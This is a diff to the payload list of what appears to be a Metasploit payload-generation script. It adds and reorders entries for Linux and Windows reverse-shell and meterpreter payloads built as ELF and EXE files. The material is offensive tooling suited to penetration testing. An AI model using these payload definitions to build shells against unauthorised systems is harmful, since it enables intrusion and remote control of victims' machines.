@@ -118,6 +118,18 @@ payloads = [
             },
             {
                 "title": "",
+                "payload": "linux/x64/meterpreter/reverse_tcp",
+                "format": "elf",
+                "filename": args.msf_file_basename + "_64.elf"
+            },
+            {
+                "title": "",
+                "payload": "linux/x86/shell/reverse_tcp",
+                "format": "elf",
+                "filename": args.msf_file_basename + ".elf"
+            },
+            {
+                "title": "",
                 "payload": "linux/x64/shell/reverse_tcp",
                 "format": "elf",
                 "filename": args.msf_file_basename + "_64.elf"
@@ -125,6 +137,18 @@ payloads = [
             {
                 "title": "",
                 "payload": "windows/meterpreter/reverse_nonx_tcp",
+                "format": "exe",
+                "filename": args.msf_file_basename + ".exe"
+            },
+            {
+                "title": "",
+                "payload": "windows/meterpreter/reverse_http",
+                "format": "exe",
+                "filename": args.msf_file_basename + ".exe"
+            },
+            {
+                "title": "",
+                "payload": "windows/meterpreter/reverse_https",
                 "format": "exe",
                 "filename": args.msf_file_basename + ".exe"
             },
@@ -193,18 +217,6 @@ payloads = [
                 "payload": "cmd/windows/powershell_reverse_tcp",
                 "format": "ps1",
                 "filename": args.msf_file_basename + ".ps1"
-            },
-            {
-                "title": "",
-                "payload": "windows/meterpreter/reverse_http",
-                "format": "exe",
-                "filename": args.msf_file_basename + ".exe"
-            },
-            {
-                "title": "",
-                "payload": "windows/meterpreter/reverse_https",
-                "format": "exe",
-                "filename": args.msf_file_basename + ".exe"
             },
             {
                 'title': 'Bash Oneliner',
